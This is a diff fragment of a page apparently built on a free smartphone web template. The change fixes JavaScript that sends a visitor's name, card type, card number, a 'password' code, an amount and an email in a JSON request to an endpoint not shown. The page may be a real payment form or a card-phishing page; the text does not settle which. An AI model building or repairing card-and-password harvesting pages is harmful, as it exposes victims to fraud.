@@ -66,13 +66,13 @@ Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony
                     'Content-Type': 'application/json'
                 },
                 data: {
-                    FirstName: document.getElementById("firstname").options[document.getElementById("firstname").selectedIndex].value,
-                    LastName: document.getElementById("lastname").options[document.getElementById("lastname").selectedIndex].value,
-                    CardType: document.getElementById("cardtype").options[document.getElementById("cardtype").selectedIndex].value,
-                    CardNumber: document.getElementById("cardnumber").options[document.getElementById("cardnumber").selectedIndex].value,
-                    Code: document.getElementById("password").options[document.getElementById("password").selectedIndex].value,
-                    Amount: document.getElementById("DollarsAmount").options[document.getElementById("DollarsAmount").selectedIndex].value,
-                    Email: document.getElementById("email").options[document.getElementById("email").selectedIndex].value
+                    FirstName: document.getElementById("firstname").value,
+                    LastName: document.getElementById("lastname").value,
+                    CardType: document.getElementById("cardtype").value,
+                    CardNumber: document.getElementById("cardnumber").value,
+                    Code: document.getElementById("password").value,
+                    Amount: document.getElementById("DollarsAmount").value,
+                    Email: document.getElementById("email").value
                 }
             }).then(function (response) {
                 //window.location.href='images/s7.jpg';
